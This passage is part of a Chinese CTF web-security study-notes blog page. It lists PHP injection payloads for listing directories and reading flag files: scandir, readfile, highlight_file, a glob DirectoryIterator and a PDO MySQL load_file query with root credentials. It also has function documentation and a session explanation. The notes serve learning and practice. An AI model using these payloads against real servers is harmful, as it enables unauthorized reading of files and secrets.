fread($a,&quot;1000&quot;);</span><br></pre></td></tr></table></figure>
+
+##### 12.路径读取
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));</span><br><span class="line">      file_get_contents(),以字符串的形式从文件中读取内容，</span><br><span class="line">      file_put_contents()，从文件中写入内容，可以传马进去，文件上传就是用的这个                            函数</span><br><span class="line">      readfile(&quot;flag.php&quot;);输出文件内容</span><br><span class="line">      var_dump(file(&quot; &quot;));</span><br><span class="line">               file协议：把整个文件读入一个数组中</span><br><span class="line">      file(string $filename, int $flags = 0, resource $context = ?):         array    filename文件的路径。返回数组形式的文件内容。数组的每个元素对应于                文件中的一行（结尾会附加换行符）。 失败时，file() 返回 false</span><br><span class="line">      php_strip_whitespace()将注释空白过滤后再返回文件内容</span><br><span class="line">c=print_r(get_defined_vars());输出注册变量</span><br><span class="line">c=var_dump(scandir(&quot;/&quot;));扫描根目录</span><br><span class="line"></span><br><span class="line">global协议</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br><span class="line"></span><br><span class="line">DirectoryIterator(&#x27;glob:///*&#x27;)</span><br></pre></td></tr></table></figure>
+
+##### 13.文件高亮
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&quot;flag.php&quot;);</span><br><span class="line">   show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
+
+###### 14.exit()
+
+##### 15.mysql load_file读取文件
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br><span class="line">select load_file()根据文件路径读取文件，然后url编码。</span><br></pre></td></tr></table></figure>
+
+##### 16.命令接口 77
+
+##### 17.双写绕过 执行第二个命令写到黑洞
+
+##### php中的文件操作函数
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1. FILE_:文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件</span><br><span class="line">   名。自 PHP 4.0.2 起，__FILE__ 总是包含一个绝对路径（如果是符号连接，则是解析</span><br><span class="line">   后的绝对路径），而在此之前的版本有时会包含一个相对路径。</span><br><span class="line"></span><br><span class="line">2. dirname()：返回路径中的目录部分</span><br><span class="line">   dirname(string $path, int $levels = 1): string</span><br><span class="line">   path表示文件路径；levels表示要向上的父目录数量，整型，必须大于 0。</span><br><span class="line">   返回值：返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（&#x27;.&#x27;），表示当前目录。</span><br><span class="line">    basename() - 返回路径中的文件名部分</span><br><span class="line">    pathinfo() - 返回文件路径的信息</span><br><span class="line">    realpath() - 返回规范化的绝对路径名</span><br><span class="line"></span><br><span class="line">3.scandir():函数返回指定目录中的文件和目录的数组。</span><br><span class="line">scandir(directory,sorting_order,context);</span><br><span class="line">第一个参数是指定的目录，第二个参数是指定升序还是降序，默认是升序，1表示降序</span><br><span class="line">第三个参数，可选，表示规定目录句柄的环境。</span><br><span class="line">返回值：文件和目录的数组。</span><br><span class="line"></span><br><span class="line">4.array_reverse():返回单元顺序相反的数组 </span><br><span class="line">array_reverse(array $array, bool $preserve_keys = false)</span><br><span class="line">array:输入的数组。</span><br><span class="line">preserve_keys:如果设置为 true 会保留数字的键。 非数字的键则不受这个设置的影响，总是会被保留。</span><br><span class="line"></span><br><span class="line">5.next():将数组中的内部指针向前移动一位,也就是将数组序号向前移动一位。</span><br><span class="line">	补充：</span><br><span class="line">	current() - 返回数组中的当前值</span><br><span class="line">    end() - 将数组的内部指针指向最后一个单元</span><br><span class="line">    prev() - 将数组的内部指针倒回一位</span><br><span class="line">    reset() - 将数组的内部指针指向第一个单元</span><br><span class="line">    each() - 返回数组中当前的键／值对并将数组指针向前移动一步</span><br><span class="line"></span><br><span class="line">6.highlight_file()和show_source():都是可以将文件的内容展示出来。</span><br><span class="line">7.print_r():可以查看内容</span><br><span class="line">8.pos():返回数组中当前元素的值，在每个数组的内部都有一个内部指针指着数组的当前元素，初始的时候是指向数组的第一个元素</span><br><span class="line">##拓展</span><br><span class="line">9.current():返回数组中当前元素的值</span><br><span class="line">10.next():将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">11.prev():将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">12.end():将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">13.reset():将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">14.ench():返回当前元素的键名和键值，并将内部指针向前移动，但是在PHP 7.2.0被废除了。</span><br><span class="line">15.localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</span><br></pre></td></tr></table></figure>
+
+s
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ession是什么，作用是什么？</span><br><span class="line">当用户访问到一个服务器，如果服务器启用Session，服务器就要为该用户创建一个SESSION，在创建这个SESSION的时候，服务器首先检查这个用户发来的请求里是否包含</span><br><span class="line">了一个SESSION ID，如果包含了一个SESSION ID则说明之前该用户已经登陆过并为此用</span><br><span class="line">户创建过SESSION，那服务器就按照这个SESSION ID把这个SESSION在服务器的内存中</span><br><span class="line">查找出来(如果查找不到，就有可能为他新创建一个)，如果客户端请求里不包含有SESSION </span><br><span class="line">ID，则为该客户端创建一个SESSION并生成一个与此SESSION相关的SESSION ID。这个</span><br><span class="line">SESSION ID是唯一的、不重复的、不容易找到规律的字符串，这个SESSION ID将被在本</span><br><span class="line">次响应中返回到客户端保存，而保存这个SESSION ID的正是COOKIE，这样在交互过程中</span><br><span class="line">浏览器可以自动的按照规则把这个标识发送给服务器</span><br><span class="line"></span><br><span class="line">会话又是什么？</span><br><span class="line">会话就是session，主要为了暂时存储用户的信息，提高浏览器跟服务器交互的效率，避免重复。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">strings命令 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</span><br><span class="line">列出ls中所有的ASCII文本：</span><br><span class="line">strings /bin/ls</span><br><span class="line">列出ls中所有的ASCII文本：</span><br><span class="line">cat /bin/ls strings</span><br><span class="line">查找ls中包含libc的字符串，不区分大小写：</span><br><span class="line">strings /bin/ls | grep -i libc</span><br></pre></td></tr></table></figure>
+
+---
+
+来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/fc996gn42og3od8i
+语雀文档ID: 111139793
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/09/16/38-SSRF/" rel="prev" title="SSRF">
+      <i class="fa fa-chevron-left"></i> SSRF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/09/16/40-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E4%BE%8B%E9%A2%98/" rel="next" title="弱类型例题">
+      弱类型例题 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="谷氨酸棒状杆菌"
+      src="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+  <p class="site-author-name" itemprop="name">谷氨酸棒状杆菌</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Glut4micum" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Glut4micum" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">谷氨酸棒状杆菌</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总访客量 fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总阅读量 fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
